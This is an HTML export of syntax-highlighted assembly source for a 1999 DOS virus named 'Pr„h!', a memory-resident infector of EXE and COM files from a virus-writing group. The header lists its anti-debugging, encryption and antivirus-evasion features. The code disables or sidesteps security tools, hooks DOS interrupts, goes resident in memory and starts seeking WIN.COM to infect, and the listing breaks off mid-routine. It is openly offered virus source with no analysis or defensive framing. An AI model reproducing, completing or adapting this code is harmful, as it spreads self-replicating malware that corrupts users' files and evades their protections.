<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; &lt;-------------------------//LineZer0 Network 99\\-------------------------&gt;</span><span class="sc0">
</span><span class="sc1">; =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ~EXE/COM Infector.Pr„h!~</span><span class="sc0">
</span><span class="sc1">; =========================</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Identification:</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ~Virusname:     Pr„h!</span><span class="sc0">
</span><span class="sc1">;   ~Size:      1454 bytes in EXEs (plus 7 bytes in COMs plus 17 to</span><span class="sc0">
</span><span class="sc1">;            32 padding bytes)</span><span class="sc0">
</span><span class="sc1">;   ~Version:   1.03</span><span class="sc0">
</span><span class="sc1">;   ~Origin:    Austria</span><span class="sc0">
</span><span class="sc1">;   ~Author:    Black Jack / [LineZer0 &amp; Metaphase]</span><span class="sc0">
</span><span class="sc1">;   ~Date:      April, 1999</span><span class="sc0">
</span><span class="sc1">;   ~Type:      Memory resident appending infector of DOS EXE and </span><span class="sc0">
</span><span class="sc1">;                         COM files.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Features:</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ~Payload:       Yes</span><span class="sc0">
</span><span class="sc1">;   ~Stealth:       Nope</span><span class="sc0">
</span><span class="sc1">;   ~Tunneling:         Nope</span><span class="sc0">
</span><span class="sc1">;   ~Retro:         Yes</span><span class="sc0">
</span><span class="sc1">;   ~Polymorph:     Nope</span><span class="sc0">
</span><span class="sc1">;   ~Encrypted:         Yes</span><span class="sc0">
</span><span class="sc1">;   ~Anti-emulation:    Yes</span><span class="sc0">
</span><span class="sc1">;   ~Anti-debugging:        Yes</span><span class="sc0">
</span><span class="sc1">;   ~Date/Time:     Yes</span><span class="sc0">
</span><span class="sc1">;   ~Attribute:     Yes</span><span class="sc0">
</span><span class="sc1">;   ~Int 24h handler:   Yes</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ~Windows compatibility: No, won't infect windows exe files</span><span class="sc0">
</span><span class="sc1">;               can infect ENUNS com files correctly </span><span class="sc0">
</span><span class="sc1">;               will directly infect the file </span><span class="sc0">
</span><span class="sc1">;               %windir%\WIN.COM</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ~Flaws:                 infected files packed with EXEPACK will</span><span class="sc0">
</span><span class="sc1">;               return to DOS with the error</span><span class="sc0">
</span><span class="sc1">;                   message "Packed file is corrupt." if the</span><span class="sc0">
</span><span class="sc1">;               virus isn't memory resident, but they work </span><span class="sc0">
</span><span class="sc1">;               fine if it is already installed (but only </span><span class="sc0">
</span><span class="sc1">;               if the virus modifies the CX register). I</span><span class="sc0">
</span><span class="sc1">;               have no explanation for this - can anyone</span><span class="sc0">
</span><span class="sc1">;                   help me please?</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   ~Detection:             heuristically undetectable for AVP 3.0.128,</span><span class="sc0">
</span><span class="sc1">;               Dr. Web 3.27, TBAV 8.08, NOD32 1.15. F-prot </span><span class="sc0">
</span><span class="sc1">;               3.04a /PARANOID is so stupid that it doesn't </span><span class="sc0">
</span><span class="sc1">;               even find the unencrypted first generation</span><span class="sc0">
</span><span class="sc1">;               exe, while f-prot 2.27 /PARANOID finds a </span><span class="sc0">
</span><span class="sc1">;               "modified variant of Sepultura". F-Prot - </span><span class="sc0">
</span><span class="sc1">;               once the best, now the worst.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ~Assemble with:     TASM /M5 prah.asm</span><span class="sc0">
</span><span class="sc1">;               TLINK prah.asm</span><span class="sc0">



</span><span class="sc1">; *** CONSTANTS *************************************************************</span><span class="sc0">

</span><span class="sc5">viruslength</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))</span><span class="sc0">
</span><span class="sc5">mem_l</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">end_mem</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))</span><span class="sc0">
</span><span class="sc5">com_start_l</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">end_com_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_for_com</span><span class="sc4">))</span><span class="sc0">
</span><span class="sc5">encryption_l</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">end_encryption</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start_encryption</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ping</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'pr'</span><span class="sc0">
</span><span class="sc5">pong</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'„h'</span><span class="sc0">

</span><span class="sc1">; *** DIRECTIVES ************************************************************</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0">
</span><span class="sc9">dosseg</span><span class="sc0">
</span><span class="sc9">.stack</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc2">.186</span><span class="sc0">

</span><span class="sc5">host_seg</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                       </span><span class="sc1">; display message</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">                   </span><span class="sc1">; quit program</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Infected with the Pr„h!-virus"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"$"</span><span class="sc0">

</span><span class="sc5">host_seg</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">; ***** CODE ****************************************************************</span><span class="sc0">

</span><span class="sc5">virus_seg</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">virus_seg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">virus_seg</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; SAVE REGISTERS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; -""-</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; -""-</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">psp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; save psp address in variable</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0135h</span><span class="sc0">                   </span><span class="sc1">; get int vector 1</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">; prevents thunderbyte's '#'-flag</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">int1_segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">int1_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0125h</span><span class="sc0">                   </span><span class="sc1">; set int vector 1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int1_handler</span><span class="sc0">     </span><span class="sc1">; to DS:DX</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">; prevents thunderbyte's '#'-flag</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">skip_encryption</span><span class="sc0">            </span><span class="sc1">;1st generation:will be replaced with:</span><span class="sc0">
    </span><span class="sc1">; CALL decrypt</span><span class="sc0">

</span><span class="sc5">start_encryption</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Encrypt from here</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2501h</span><span class="sc0">                   </span><span class="sc1">; set int 1 vector back</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">org_int1</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; DS=CS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                    </span><span class="sc1">; OPEN TBDRVXXX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D00h</span><span class="sc0">                   </span><span class="sc1">; open read only</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbdriver</span><span class="sc0">         </span><span class="sc1">; DS:DX=Pointer to filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">no_tbdrv</span><span class="sc0">                     </span><span class="sc1">; if error, no TBDRIVER found =&gt; OK</span><span class="sc0">
    
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; handle to bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                     </span><span class="sc1">; Close file again</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; call dos</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">                      </span><span class="sc1">; get outta here to avoid detection!</span><span class="sc0">
    
</span><span class="sc5">no_tbdrv</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FA01h</span><span class="sc0">                  </span><span class="sc1">; disable VSAFE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05945h</span><span class="sc0">                  </span><span class="sc1">; just as a joke...</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ping</span><span class="sc0">                    </span><span class="sc1">; See if already resident</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pong</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">load_virus_into_mem</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">
</span><span class="sc5">load_virus_into_mem</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5803h</span><span class="sc0">                   </span><span class="sc1">; use UMBs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">retry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                     </span><span class="sc1">; RESERVE MEMORY</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mem_l</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">       </span><span class="sc1">; virus length in paragraphs</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">getmem_ok</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">psp</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; let es point to mcb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">                     </span><span class="sc1">; change memory size of our mcb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; reserved memory size into BX</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">mem_l</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; sub length of virus in memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">psp</span><span class="sc0">                     </span><span class="sc1">; set ES to psp address again</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">retry</span><span class="sc0">

</span><span class="sc5">getmem_ok</span><span class="sc4">:</span><span class="sc0">
                    </span><span class="sc1">; COPY VIRUS CODE</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; DS:SI = pointer to source</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; ES:DI = pointer to destination</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AX=segment address of our mem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mem_l</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; length in words</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">

                    </span><span class="sc1">; CHANGE PSP-ADDRESS IN MCB</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; set DS to our memory block</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; AX=segment address of our mem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AX-1=MCB address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">; make it a system area</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">                   </span><span class="sc1">; get interrupt vector 21h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">int21_segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; save vector</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">int21_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2521h</span><span class="sc0">                   </span><span class="sc1">; set interrupt vector 21h to virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_handler</span><span class="sc0">    </span><span class="sc1">; DS:DX=pointer to new routine</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5803h</span><span class="sc0">                   </span><span class="sc1">; don't use UMBs any more</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; ----- DIRECT INFECTION ----------------------------------------------------</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">psp</span><span class="sc0">                     </span><span class="sc1">; restore psp address in ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">                     </span><span class="sc1">; Get enviroment block in ES</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; ES:DI=start enviroment block</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; DS=CS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; al=0 for rep scasb</span><span class="sc0">
</span><span class="sc5">get_windir_head</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; save momentan position in enviroment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc0">           </span><span class="sc1">; DS:SI=pointer to "windir="</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                       </span><span class="sc1">; length of "windir="</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                       </span><span class="sc1">; compare it</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">windir_found</span><span class="sc0">                 </span><span class="sc1">; found it!</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; restore momentan pos in enviroment</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; set cx=0FFFFh</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                     </span><span class="sc1">; search for value in al (zero)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; if there's another zero, it's the end</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">get_windir_head</span><span class="sc0">             </span><span class="sc1">; otherwise compare next variable</span><span class="sc0">

</span><span class="sc5">windir_not_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">                   </span><span class="sc1">; Get Attrib (to infect)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win_path</span><span class="sc0">         </span><span class="sc1">; assume windir=C:\WINDOWS</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">end_getwin</span><span class="sc0">

</span><span class="sc5">windir_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; remove di, we don't need it anymore</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; copy path to buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; DS:SI=source</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; ES:DI=destination</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    
</span><span class="sc5">copy_windir_head</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; copy it!</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
